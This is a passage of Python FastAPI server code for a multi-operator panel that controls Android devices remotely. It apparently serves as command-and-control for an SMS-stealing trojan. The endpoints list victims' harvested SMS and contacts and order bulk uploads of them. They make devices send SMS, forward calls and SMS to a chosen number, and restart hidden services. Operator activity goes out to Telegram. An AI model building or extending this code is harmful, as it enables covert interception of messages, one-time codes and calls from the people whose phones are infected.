            icon=app_info['icon'],
            count=item["count"]
        ))

    return AppTypesResponse(
        app_types=app_types,
        total=len(app_types)
    )

@app.get("/api/devices", response_model=DeviceListResponse)
async def get_devices(
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    app_type: Optional[str] = Query(None, description="Filter by application type"),
    admin_username: Optional[str] = Query(None, description="Filter by admin (Super Admin only)"),
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):

    is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN

    if is_super_admin:

        if admin_username and admin_username.strip():
            query = {"admin_username": admin_username.strip()}
        else:
            query = {}
    else:

        query = {"admin_username": current_admin.username}

    if app_type:
        query["app_type"] = app_type

    query["model"] = {"$exists": True, "$ne": None}
    query["is_deleted"] = {"$ne": True}

    # Sort: By registered_at (newest first) - newly registered devices appear first
    devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort([
        ("registered_at", -1)   # Newest registered devices first
    ])
    devices_raw = await devices_cursor.to_list(length=limit)

    # Check online status from Redis for all devices
    from .services.device_online_tracker import device_online_tracker
    from datetime import timedelta
    from app.utils.datetime_utils import ensure_utc, utc_now
    
    device_ids = [d["device_id"] for d in devices_raw]
    redis_online_status = await device_online_tracker.get_online_devices(device_ids)
    
    five_minutes_ago = utc_now() - timedelta(minutes=5)

    devices = []
    for device_doc in devices_raw:
        try:
            # Update online status from Redis if available
            device_id = device_doc.get("device_id")
            if device_id in redis_online_status and redis_online_status[device_id]:
                # Redis says online, but verify last_online_update is recent
                last_online_update = ensure_utc(device_doc.get("last_online_update")) if device_doc.get("last_online_update") else None
                
                if last_online_update and last_online_update >= five_minutes_ago:
                    # Confirmed online
                    device_doc["is_online"] = True
                    device_doc["status"] = "online"
                else:
                    # Redis is stale, clear it
                    asyncio.create_task(device_online_tracker.mark_offline(device_id))
                    device_doc["is_online"] = False
                    device_doc["status"] = "offline"
            else:
                # Redis says offline or not found
                device_doc["is_online"] = False
                device_doc["status"] = "offline"
            
            normalized = device_service._normalize_device_data(device_doc)
            devices.append(Device(**normalized))
        except Exception as e:
            logger.warning(f"Skipping device {device_doc.get('device_id')}: {e}")
            continue

    total = await mongodb.db.devices.count_documents(query)

    has_more = (skip + len(devices)) < total

    return DeviceListResponse(
        devices=devices,
        total=total,
        hasMore=has_more
    )

@app.get("/api/admin/{admin_username}/devices", response_model=DeviceListResponse)
async def get_admin_devices(
    admin_username: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    app_type: Optional[str] = Query(None, description="Filter by application type"),
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):

    target_admin = await auth_service.get_admin_by_username(admin_username)
    if not target_admin:
        raise HTTPException(status_code=404, detail=f"Admin '{admin_username}' not found")

    query = {"admin_username": admin_username}
    if app_type:
        query["app_type"] = app_type

    query["model"] = {"$exists": True, "$ne": None}
    query["is_deleted"] = {"$ne": True}

    # Sort: By registered_at (newest first) - newly registered devices appear first
    devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort([
        ("registered_at", -1)   # Newest registered devices first
    ])
    devices_raw = await devices_cursor.to_list(length=limit)

    # Check online status from Redis for all devices
    from .services.device_online_tracker import device_online_tracker
    from datetime import timedelta
    from app.utils.datetime_utils import ensure_utc, utc_now
    
    device_ids = [d["device_id"] for d in devices_raw]
    redis_online_status = await device_online_tracker.get_online_devices(device_ids)
    
    five_minutes_ago = utc_now() - timedelta(minutes=5)

    devices = []
    for device_doc in devices_raw:
        try:
            # Update online status from Redis if available
            device_id = device_doc.get("device_id")
            if device_id in redis_online_status and redis_online_status[device_id]:
                # Redis says online, but verify last_online_update is recent
                last_online_update = ensure_utc(device_doc.get("last_online_update")) if device_doc.get("last_online_update") else None
                
                if last_online_update and last_online_update >= five_minutes_ago:
                    # Confirmed online
                    device_doc["is_online"] = True
                    device_doc["status"] = "online"
                else:
                    # Redis is stale, clear it
                    asyncio.create_task(device_online_tracker.mark_offline(device_id))
                    device_doc["is_online"] = False
                    device_doc["status"] = "offline"
            else:
                # Redis says offline or not found
                device_doc["is_online"] = False
                device_doc["status"] = "offline"
            
            normalized = device_service._normalize_device_data(device_doc)
            devices.append(Device(**normalized))
        except Exception as e:
            logger.warning(f"Skipping device {device_doc.get('device_id')}: {e}")
            continue

    total = await mongodb.db.devices.count_documents(query)
    has_more = (skip + len(devices)) < total

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.VIEW_DEVICE,
            description=f"Viewed devices for admin: {admin_username}" + (f" (app: {app_type})" if app_type else ""),
            ip_address="system"
        )
    )

    return DeviceListResponse(
        devices=devices,
        total=total,
        hasMore=has_more
    )

@app.get("/api/devices/{device_id}")
async def get_device(
    device_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    device = await device_service.get_device(device_id)

    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    # Check online status from Redis
    from .services.device_online_tracker import device_online_tracker
    redis_is_online = await device_online_tracker.is_online(device_id)
    
    logger.info(f"🔍 [GET_DEVICE] Device: {device_id}, Redis says online: {redis_is_online}, MongoDB is_online: {device.is_online}, last_online_update: {device.last_online_update}")
    
    # Verify Redis status against actual last_online_update timestamp
    if redis_is_online:
        # If Redis says online, verify last_online_update is recent (within 5 minutes)
        from datetime import timedelta
        from app.utils.datetime_utils import ensure_utc, utc_now
        
        five_minutes_ago = utc_now() - timedelta(minutes=5)
        last_online_update = ensure_utc(device.last_online_update) if device.last_online_update else None
        
        # If last_online_update is old, Redis is stale - clear it and mark offline
        if not last_online_update or last_online_update < five_minutes_ago:
            logger.warning(f"⚠️ [GET_DEVICE] Redis says online but last_online_update is old ({last_online_update}), marking offline")
            await device_online_tracker.mark_offline(device_id)
            device.is_online = False
            device.status = "offline"
        else:
            # Redis is correct and recent
            logger.info(f"✅ [GET_DEVICE] Device is online (Redis + recent last_online_update)")
            device.is_online = True
            device.status = "online"
    else:
        # Redis says offline or not found
        logger.info(f"❌ [GET_DEVICE] Redis says offline or not available")
        device.is_online = False
        device.status = "offline"
    
    # Note: We don't update last_online_update here because this is just a GET request
    # last_online_update should only be updated when device actually sends data

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.VIEW_DEVICE,
            description=f"Viewed device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id
        )
    )

    return device

@app.get("/api/devices/{device_id}/sms")
async def get_device_sms(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(50, ge=1, le=500),
    request: Request = None,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_SMS))
):
    logger.info(f"📋 [GET_SMS] Request received - Device: {device_id}, Admin: {current_admin.username}, Skip: {skip}, Limit: {limit}")
    
    # Check if device exists
    device = await device_service.get_device(device_id)
    if not device:
        logger.warning(f"⚠️ [GET_SMS] Device not found - Device: {device_id}")
        raise HTTPException(status_code=404, detail="Device not found")
    
    logger.info(f"📋 [GET_SMS] Device found - Device: {device_id}, Admin: {device.admin_username}")
    
    # Check total count first
    total = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
    logger.info(f"📋 [GET_SMS] Total SMS count in database: {total} for device {device_id}")
    
    messages = await device_service.get_sms_messages(device_id, skip, limit)
    logger.info(f"📋 [GET_SMS] Retrieved {len(messages)} messages from database for device {device_id}")

    logger.info(f"📋 [GET_SMS] Starting message processing - Device: {device_id}, Count: {len(messages)}")
    
    for msg in messages:
        if msg.get('body'):
            msg['body'] = msg['body'].replace('\ufffd', '').strip()

    logger.info(f"📋 [GET_SMS] Message processing completed - Device: {device_id}")

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.VIEW_SMS,
            description=f"Viewed SMS for device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"count": len(messages), "total": total}
        )
    )

    logger.info(f"✅ [GET_SMS] Returning {len(messages)} messages (total: {total}) for device {device_id}")
    return {
        "messages": messages,
        "total": total,
        "page": skip // limit + 1,
        "page_size": limit
    }

@app.get("/api/devices/{device_id}/contacts")
async def get_device_contacts(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    request: Request = None,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_CONTACTS))
):
    logger.info(f"📋 [GET_CONTACTS] Request received - Device: {device_id}, Admin: {current_admin.username}, Skip: {skip}, Limit: {limit}")
    
    contacts = await device_service.get_contacts(device_id, skip, limit)
    logger.info(f"📋 [GET_CONTACTS] Retrieved {len(contacts)} contacts from database for device {device_id}")
    
    total = await mongodb.db.contacts.count_documents({"device_id": device_id})
    logger.info(f"📋 [GET_CONTACTS] Total contacts count: {total} for device {device_id}")

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.VIEW_CONTACTS,
            description=f"Viewed contacts for device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"count": len(contacts)}
        )
    )

    logger.info(f"✅ [GET_CONTACTS] Returning {len(contacts)} contacts (total: {total}) for device {device_id}")
    return {
        "contacts": contacts,
        "total": total
    }

@app.get("/api/devices/{device_id}/logs")
async def get_device_logs(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    logs = await device_service.get_logs(device_id, skip, limit)
    total = await mongodb.db.logs.count_documents({"device_id": device_id})

    return {
        "logs": logs,
        "total": total
    }

@app.post("/api/devices/{device_id}/command")
async def send_command_to_device(
    device_id: str,
    command_request: SendCommandRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.SEND_COMMANDS))
):
    # Always log ping commands for debugging
    logger.info(f"[PING_DEBUG] 🔵 [COMMAND] Received command: {command_request.command} for device: {device_id}")
    
    device = await device_service.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    logger.info(f"[PING_DEBUG] 🔵 [COMMAND] Device found - last_ping: {device.last_ping}, last_online_update: {device.last_online_update}")

    if command_request.command == "note":
        priority = command_request.parameters.get("priority", "none")
        message = command_request.parameters.get("message", "")

        success = await device_service.save_device_note(device_id, priority, message)

        if not success:
            raise HTTPException(status_code=400, detail="Failed to save note")

        result = await firebase_service.send_command_to_device(
            device_id,
            "note",
            {
                "priority": priority,
                "message": message
            }
        )

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Sent note to device: {device_id} - Priority: {priority}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "note", "priority": priority, "message": message}
            )
        )

        return {
            "success": True,
            "message": "Note saved and sent successfully",
            "type": "note",
            "result": result
        }

    is_ping_command = command_request.command == "ping"
    ping_type = command_request.parameters.get("type", "server") if command_request.parameters else "server"

    if is_ping_command and ping_type == "firebase":
        # Always log ping flow for debugging
        logger.info(f"[PING_DEBUG] 🟠 [PING] Manual ping START - Admin: {current_admin.username}, Device: {device_id}")
        logger.info(f"[PING_DEBUG] 🟠 [PING] Device timestamps BEFORE ping - last_ping: {device.last_ping}, last_online_update: {device.last_online_update}")

        params = {k: v for k, v in (command_request.parameters or {}).items() if k != "type"}

        # Check device status before ping
        device_before = await mongodb.db.devices.find_one(
            {"device_id": device_id},
            {"is_deleted": 1, "is_uninstalled": 1, "status": 1, "last_ping": 1, "last_online_update": 1}
        )
        if device_before:
            logger.info(f"[PING_DEBUG] 🟠 [PING] DB BEFORE ping - last_ping: {device_before.get('last_ping')}, last_online_update: {device_before.get('last_online_update')}")
        
        result = await firebase_service.send_command_to_device(
            device_id,
            "ping",
            params if params else None
        )
        
        logger.info(f"[PING_DEBUG] 🟠 [PING] Firebase command sent - Result: {result.get('success')}")

        # Check device status after ping
        device_after = await mongodb.db.devices.find_one(
            {"device_id": device_id},
            {"is_deleted": 1, "is_uninstalled": 1, "status": 1, "last_ping": 1, "last_online_update": 1}
        )
        if device_after:
            logger.info(f"[PING_DEBUG] 🟠 [PING] DB AFTER ping - last_ping: {device_after.get('last_ping')}, last_online_update: {device_after.get('last_online_update')}")
        
        logger.info(f"[PING_DEBUG] 🟠 [PING] Manual ping END - Device: {device_id}")

        # Check if device was marked as uninstalled
        if result.get("is_uninstalled"):
            logger.warning(f"⚠️ [PING] Device marked as uninstalled: {device_id}")
            # Run log_activity in background to avoid timeout
            asyncio.create_task(
                admin_activity_service.log_activity(
                    admin_username=current_admin.username,
                    activity_type=ActivityType.SEND_COMMAND,
                    description=f"Firebase ping failed - Device marked as uninstalled: {device_id}",
                    ip_address=get_client_ip(request),
                    device_id=device_id,
                    metadata={"command": "ping", "type": "firebase", "result": result, "is_uninstalled": True}
                )
            )
            await device_service.add_log(
                device_id, "system", "Device marked as uninstalled (app uninstalled or clear data)", "warning"
            )
            return {
                "success": False,
                "message": "Device marked as uninstalled - All FCM tokens are unregistered (app likely uninstalled or clear data)",
                "type": "firebase",
                "is_uninstalled": True,
                "result": result
            }

        if not result["success"]:
            logger.error(f"❌ [PING] Ping failed for device {device_id}: {result.get('message', 'Unknown error')}")
            raise HTTPException(status_code=400, detail=result["message"])

        logger.info(f"✅ [PING] Ping successful for device {device_id} - Sent: {result.get('sent_count', 0)}/{result.get('total_tokens', 0)}")

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Sent Firebase ping to device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "ping", "type": "firebase", "result": result}
            )
        )

        # Run add_log and telegram notification in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", f"Firebase ping sent - Result: {result.get('sent_count', 0)}/{result.get('total_tokens', 0)}", "info"
            )
        )
        
        asyncio.create_task(
            telegram_multi_service.notify_command_sent(
                current_admin.username, device_id, "ping (firebase)"
            )
        )

        logger.info(f"📊 [PING] Final API response for device {device_id}: success={result['success']}, sent={result.get('sent_count', 0)}/{result.get('total_tokens', 0)}")

        return {
            "success": True,
            "message": f"Firebase ping sent: {result['message']}",
            "type": "firebase",
            "result": result
        }

    if command_request.command == "send_sms":
        phone = command_request.parameters.get("phone")
        message = command_request.parameters.get("message")
        sim_slot = command_request.parameters.get("simSlot", 0)

        if not phone or not message:
            raise HTTPException(status_code=400, detail="Phone and message are required")

        result = await firebase_service.send_sms(
            device_id=device_id,
            phone=phone,
            message=message,
            sim_slot=int(sim_slot)
        )

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Sent SMS command to device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "send_sms", "phone": phone, "sim_slot": sim_slot, "result": result}
            )
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", f"SMS command sent to {phone} - Result: {result.get('message', 'unknown')}", "info" if result.get("success") else "error"
            )
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "call_forwarding":
        forward_number = command_request.parameters.get("number")
        sim_slot = command_request.parameters.get("simSlot", 0)

        if not forward_number:
            raise HTTPException(status_code=400, detail="Forward number is required")

        result = await firebase_service.enable_call_forwarding(
            device_id=device_id,
            forward_number=forward_number,
            sim_slot=int(sim_slot)
        )

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Enabled call forwarding on device: {device_id} to {forward_number}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "call_forwarding", "number": forward_number, "sim_slot": sim_slot}
            )
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", f"Call forwarding enabled to {forward_number}", "info"
            )
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "call_forwarding_disable":
        sim_slot = command_request.parameters.get("simSlot", 0)

        result = await firebase_service.disable_call_forwarding(
            device_id=device_id,
            sim_slot=int(sim_slot)
        )

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Disabled call forwarding on device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "call_forwarding_disable", "sim_slot": sim_slot}
            )
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", "Call forwarding disabled", "info"
            )
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "quick_upload_sms":
        result = await firebase_service.quick_upload_sms(device_id)

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Requested quick SMS upload from device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "quick_upload_sms"}
            )
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", "Quick SMS upload requested", "info"
            )
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "quick_upload_contacts":
        result = await firebase_service.quick_upload_contacts(device_id)

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Requested quick contacts upload from device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "quick_upload_contacts"}
            )
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", "Quick contacts upload requested", "info"
            )
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "upload_all_sms":
        result = await firebase_service.upload_all_sms(device_id)

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Requested full SMS upload from device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "upload_all_sms"}
            )
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", "Full SMS upload requested", "info"
            )
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "upload_all_contacts":
        result = await firebase_service.upload_all_contacts(device_id)

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Requested full contacts upload from device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "upload_all_contacts"}
            )
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", "Full contacts upload requested", "info"
            )
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "start_services":
        result = await firebase_service.start_services(device_id)

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Requested start services on device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "start_services"}
            )
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", "Start services requested (SmsService + HeartbeatService + WorkManager)", "info"
            )
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "restart_heartbeat":
        result = await firebase_service.restart_heartbeat(device_id)

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Requested heartbeat restart on device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"command": "restart_heartbeat"}
            )
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                device_id, "command", "Heartbeat service restart requested", "info"
            )
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    else:
        raise HTTPException(
            status_code=400,
            detail=f"Unknown command: {command_request.command}"
        )

@app.post("/api/devices/ping-all")
async def ping_all_devices(
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    """Ping all devices via Firebase topic"""
    try:
        logger.info(f"📡 [PING] Ping all devices requested by admin: {current_admin.username}")
        logger.info(f"📡 [PING] Calling firebase_service.ping_all_devices_async() for parallel async pings")
        
        # Use async parallel ping (faster and allows tracking failures)
        result = await firebase_service.ping_all_devices_async()
        
        logger.info(f"📊 [PING] Ping all devices result: {result}")
        
        if result.get("success"):
            logger.info(f"✅ [PING] Ping all devices successful - Success: {result.get('success_count', 0)}, Failed: {result.get('failed_count', 0)}")
        else:
            logger.error(f"❌ [PING] Ping all devices failed: {result.get('message', 'Unknown error')}")
        
        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Sent ping to all devices (async parallel) - Success: {result.get('success_count', 0)}, Failed: {result.get('failed_count', 0)}",
                ip_address=get_client_ip(request),
                metadata={"command": "ping_all", "result": result}
            )
        )
        
        logger.info(f"📊 [PING] Ping all devices completed - Admin: {current_admin.username}, Success: {result.get('success', False)}")
        
        return {
            "success": result.get("success", False),
            "message": result.get("message", "Ping all devices completed"),
            "result": result
        }
    except Exception as e:
        logger.error(f"❌ [PING] Error pinging all devices: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.put("/api/devices/{device_id}/note")
async def update_device_note(
    device_id: str,
    note_request: UpdateNoteRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    device = await device_service.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    priority = note_request.priority
    message = note_request.message

    if priority is None and message is None:
        raise HTTPException(status_code=400, detail="Either priority or message must be provided")

    if priority == "":
        priority = None
    if message == "":
        message = None

    success = await device_service.save_admin_note(
        device_id,
        priority,
        message
    )

    if not success:
        raise HTTPException(status_code=400, detail="Failed to update admin note")

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Updated admin note for device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"priority": priority, "has_message": message is not None and message != ""}
        )
    )

    return {
        "success": True,
        "message": "Admin note updated successfully"
    }

@app.put("/api/devices/{device_id}/settings")
async def update_device_settings(
    device_id: str,
    settings_request: UpdateSettingsRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.CHANGE_SETTINGS))
):

    device = await device_service.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    settings_dict = settings_request.model_dump(exclude_unset=True)
    await device_service.update_device_settings(device_id, settings_dict)

    if manager.is_connected(device_id):
        if "sms_forward_enabled" in settings_dict:
            await manager.send_command(
                device_id,
                "toggle_forward",
                {"enabled": settings_dict["sms_forward_enabled"]}
            )

        if "forward_number" in settings_dict:
            await manager.send_command(
                device_id,
                "change_forward_number",
                {"number": settings_dict["forward_number"]}
            )

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.CHANGE_SETTINGS,
            description=f"Changed settings for device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"changes": settings_dict}
        )
    )

    try:
        await telegram_multi_service.notify_admin_action(
            current_admin.username,
            "Settings Changed",
            f"Changes: {', '.join(settings_dict.keys())}",
            ip_address=get_client_ip(request),
            device_id=device_id
        )
    except Exception as e:
        logger.warning(f"Failed to send Telegram notification: {e}")

    await device_service.add_log(
        device_id, "settings", "Settings updated", "info", settings_dict
    )

    return {
        "success": True,
        "message": "Settings updated successfully"
    }

@app.delete("/api/devices/{device_id}/sms")
async def delete_device_sms(
    device_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
):
    result = await mongodb.db.sms_messages.delete_many({"device_id": device_id})
    now = utc_now()
    await mongodb.db.devices.update_one(
        {"device_id": device_id},
        {"$set": {"sms_blocked": True, "sms_blocked_at": now}}
    )

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.DELETE_DATA,
            description=f"Deleted {result.deleted_count} SMS from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"type": "sms", "count": result.deleted_count}
        )
    )

    try:
        await telegram_multi_service.notify_admin_action(
            current_admin.username,
            "Data Deleted",
            f"Deleted {result.deleted_count} SMS messages",
            ip_address=get_client_ip(request),
            device_id=device_id
        )
    except Exception as e:
        logger.warning(f"Failed to send Telegram notification: {e}")

    return {
        "success": True,
        "deleted_count": result.deleted_count
    }

@app.delete("/api/devices/{device_id}/sms/{sms_id}")
async def delete_device_sms_single(
    device_id: str,
    sms_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
):
    query = {"device_id": device_id, "sms_id": sms_id}
    result = await mongodb.db.sms_messages.delete_one(query)
    if result.deleted_count == 0 and ObjectId.is_valid(sms_id):
        result = await mongodb.db.sms_messages.delete_one({"device_id": device_id, "_id": ObjectId(sms_id)})

    # Track deleted SMS IDs to prevent re-ingest
    await mongodb.db.devices.update_one(
        {"device_id": device_id},
        {"$addToSet": {"deleted_sms_ids": sms_id}}
    )

    # Run log_activity and telegram notification in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.DELETE_DATA,
            description=f"Deleted single SMS {sms_id} from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"type": "sms_single", "id": sms_id, "count": result.deleted_count},
            send_telegram=True
        )
    )
    
    asyncio.create_task(
        telegram_multi_service.notify_admin_action(
            current_admin.username,
            "SMS Deleted",
            f"Deleted 1 SMS (id: {sms_id})",
            ip_address=get_client_ip(request),
            device_id=device_id
        )
    )

    return {
        "success": True,
        "deleted_count": result.deleted_count
    }

@app.delete("/api/devices/{device_id}/contacts")
async def delete_device_contacts(
    device_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
):
    result = await mongodb.db.contacts.delete_many({"device_id": device_id})
    now = utc_now()
    await mongodb.db.devices.update_one(
        {"device_id": device_id},
        {"$set": {"contacts_blocked": True, "contacts_blocked_at": now}}
    )

    # Run log_activity and telegram notification in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.DELETE_DATA,
            description=f"Deleted {result.deleted_count} contacts from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"type": "contacts", "count": result.deleted_count},
            send_telegram=True
        )
    )
    
    asyncio.create_task(
        telegram_multi_service.notify_admin_action(
            admin_username=current_admin.username,
            action="contacts_deleted",
            details=f"Deleted {result.deleted_count} contacts",
            ip_address=get_client_ip(request),
            device_id=device_id
        )
    )

    return {
        "success": True,
        "deleted_count": result.deleted_count
    }

@app.delete("/api/devices/{device_id}/contacts/{contact_id}")
async def delete_device_contact(
    device_id: str,
    contact_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
):
    query = {
        "device_id": device_id,
        "$or": [
            {"contact_id": contact_id},
            {"_id": ObjectId(contact_id) if ObjectId.is_valid(contact_id) else contact_id}
        ]
    }
    result = await mongodb.db.contacts.delete_one(query)

    # Track deleted contact IDs to prevent re-ingest
    await mongodb.db.devices.update_one(
        {"device_id": device_id},
        {"$addToSet": {"deleted_contact_ids": contact_id}}
    )

    # Run log_activity and telegram notification in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.DELETE_DATA,
            description=f"Deleted contact {contact_id} from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"type": "contact_single", "id": contact_id, "count": result.deleted_count},
            send_telegram=True
        )
    )
    
    asyncio.create_task(
        telegram_multi_service.notify_admin_action(
            current_admin.username,
            "Contact Deleted",
            f"Deleted contact (id: {contact_id})",
            ip_address=get_client_ip(request),
            device_id=device_id
        )
    )

    return {
        "success": True,
        "deleted_count": result.deleted_count
    }

@app.delete("/api/devices/{device_id}/calls")
async def delete_device_calls(
    device_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
):
    result = await mongodb.db.call_logs.delete_many({"device_id": device_id})
    now = utc_now()
    await mongodb.db.devices.update_one(
        {"device_id": device_id},
        {"$set": {"calls_blocked": True, "calls_blocked_at": now}}
    )

